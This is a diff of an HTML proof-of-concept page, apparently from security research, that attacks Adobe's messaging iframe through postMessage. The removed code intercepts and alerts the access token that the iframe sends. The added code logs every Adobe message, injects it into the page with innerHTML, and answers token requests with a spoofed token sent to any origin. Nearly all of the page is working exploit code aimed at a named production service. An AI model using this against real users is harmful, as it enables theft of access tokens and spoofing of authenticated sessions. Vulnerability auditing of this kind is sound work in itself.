@@ -1,28 +1,35 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Adobe PostMessage Audit</title>
+</head>
 <body>
-    <h1>Intercepting Adobe Messaging...</h1>
-    <iframe id="malicious_iframe" 
-        src="https://ui.messaging.adobe.com/3.8.16/index.html?lc=en_us#%7B%22window_origin%22%3A%22https%3A%2F%2Facrobat.adobe.com%22%2C%22iframe_origin%22%3A%22https%3A%2F%2Fui.messaging.adobe.com%2F3.8.16%2Findex.html%22%2C%22popped%22%3Afalse%7D" 
-        style="width:500px; height:500px;">
+    <div id="status">Waiting for Adobe Iframe...</div>
+    
+    <iframe id="adobe_frame" 
+        src="https://ui.messaging.adobe.com/3.8.16/index.html?lc=en_us#%7B%22window_origin%22%3A%22https%3A%2F%2Facrobat.adobe.com%22%2C%22hostWindow%22%3A%22parent%22%2C%22theme%22%3A%22darkest%22%2C%22customData%22%3A%7B%22userConsent%22%3Atrue%7D%2C%22openedAsIndependentWindow%22%3Afalse%7D" 
+        style="width:400px; height:600px; border:1px solid #ccc;">
     </iframe>
 
     <script>
         window.addEventListener("message", (event) => {
-            console.log("Origin:", event.origin);
-            
-            let data = event.data;
-            
-            // Handle if data is a string (need to parse it)
-            if (typeof data === 'string') {
-                try { data = JSON.parse(data); } catch(e) { /* not JSON */ }
-            }
-
-            // Look for the adbmsgui_INITIAL_DATA message we saw earlier
-            if (data && (data.msgType === "adbmsgui_INITIAL_DATA" || data.accessToken)) {
-                console.warn("!!! TOKEN INTERCEPTED !!!");
-                console.log(data);
-                alert("Found Access Token: " + (data.accessToken || data.message.accessToken));
+            // Log everything coming from the Adobe domain
+            if (event.origin.includes("adobe.com")) {
+                console.log("--- MESSAGE RECEIVED FROM ADOBE ---");
+                console.log("Data:", event.data);
+                
+                // Update UI to show we intercepted something
+                document.getElementById("status").innerHTML = 
+                    "<b>Intercepted:</b> " + JSON.stringify(event.data);
+                
+                // If the iframe asks for a token, we try to give it a fake one
+                if (event.data && event.data.msgType.includes("SEND_ACCESS_TOKEN")) {
+                    console.warn("Iframe is asking for a token! Sending spoofed token...");
+                    event.source.postMessage(JSON.stringify({
+                        msgType: "adbmsgui_INITIAL_DATA",
+                        message: { accessToken: "SPOOFED_TOKEN_12345" }
+                    }), "*");
+                }
             }
         }, false);
     </script>
